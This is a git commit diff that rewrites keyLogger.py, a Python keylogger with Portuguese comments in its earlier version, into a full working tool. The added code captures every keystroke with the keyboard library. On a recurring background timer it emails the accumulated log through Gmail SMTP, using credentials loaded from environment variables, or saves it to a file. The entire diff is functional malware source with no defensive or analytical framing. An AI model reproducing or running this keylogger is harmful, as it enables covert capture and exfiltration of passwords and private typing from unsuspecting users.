ff5d3823e1e8a7cab2011e46fb6d52e3b76f7782
Darlan <darlaneduardoguimaraes@gmail.com>
2023-07-13 10:33:30 -0300

    keyLogger send email

--- keyLogger.py
+++ keyLogger.py
@@ -1,52 +1,101 @@
 import keyboard
-import smtplib #Envio de email usando protocolo SMTP (gmail)
-from threading import Timer # Intervalo de tempo
+import smtplib
+from threading import Timer
 from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
+import os
+from dotenv import load_dotenv
+
+load_dotenv()
+
+SEND_REPORT_EVERY = int(os.getenv("SEND_REPORT_EVERY"))
+EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
+EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
+
 
 class KeyLogger:
     def __init__(self, interval, report_method="email"):
         self.interval = interval
         self.report_method = report_method
-
-        # Log das teclas digitadas
         self.log = ""
-
-        # Define o tempo de inicio e fim da execução
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
 
-        def callback(self, event):
-            # Esse evento sempre sera chamada quando uma tecla for digitada
+    def callback(self, event):
+        name = event.name
 
-            name = event.name
+        if len(name) > 1:
+            if name == "space":
+                name = " "
+            elif name == "enter":
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
 
-            if len(name) > 1:
-                # Não é um caracter ou chave especial
-                if name == "space":
-                    name = " "
-                elif name == "enter":
-                    # adicionar uma nova linha sempre que um ENTER for pressionado
-                    name = "[ENTER]\n"
-                elif name == "decimal":
-                    name = "."
-                else:
-                    # substitua os espaços por sublinhados
-                    name = name.replace(" ", "_")
-                    name = f"[{name.upper()}]"
-                    # adiciona o nome da chave a variável global `self.log`
-                self.log += name
+        self.log += name
 
-        def update_filename(self):
-            # define o nome do arquivo a ser identificado pelas datas de início e fim
+    def update_filename(self):
+        start_dt_str = str(self.start_dt)[:19].replace(" ", "-").replace(":", "")
+        end_dt_str = str(self.end_dt)[:19].replace(" ", "-").replace(":", "")
+        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
 
-            start_dt_str = str(self.start_dt)[:7].replace(" ", "-").replace(":", "")
-            end_dt_str = str(self.end_dt)[:7].replace(" ", "-").replace(":", "")
-            self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+    def report_to_file(self):
+        with open(f"{self.filename}.txt", "w") as f:
+            print(self.log, file=f)
+        print(f"[+] Saved {self.filename}.txt")
 
-        def report_to_file(self):
-            with open(f"{self.filename}.txt", "w") as f:
-                print(self.log, file=f)
-            print(f"[+] Saved {self.filename}.txt")
+    def prepare_email(self, message):
+        msg = MIMEMultipart("alternative")
+        msg["From"] = EMAIL_ADDRESS
+        msg["To"] = EMAIL_ADDRESS
+        msg["Subject"] = "KeyLogger Logs"
+
+        html = f"<p>{message}</p>"
+        text_part = MIMEText(message, "plain")
+        html_part = MIMEText(html, "html")
+        msg.attach(text_part)
+        msg.attach(html_part)
+
+        return msg.as_string()
+
+    def send_email(self, email, password, message, verbose=1):
+        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, self.prepare_email(message))
+        server.quit()
+        if verbose:
+            print(f"{datetime.now()} - Sent an Email to {email} containing: {message}")
+
+    def report(self):
+        if self.log:
+            self.end_dt = datetime.now()
+            self.update_filename()
+            if self.report_method == "email":
+                self.send_email(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+            elif self.report_method == "file":
+                self.report_to_file()
+            print(f"[{self.filename}] - {self.log}")
+            self.log = ""
+            self.start_dt = datetime.now()
+
+        timer = Timer(interval=self.interval, function=self.report)
+        timer.daemon = True
+        timer.start()
+
+    def start(self):
+        self.start_dt = datetime.now()
+        keyboard.on_release(callback=self.callback)
+        self.report()
+        print(f"{datetime.now()} - Started keyLogger")
+        keyboard.wait()
+
+
+if __name__ == "__main__":
+    keylogger = KeyLogger(interval=SEND_REPORT_EVERY, report_method="file")
+    keylogger.start()
 
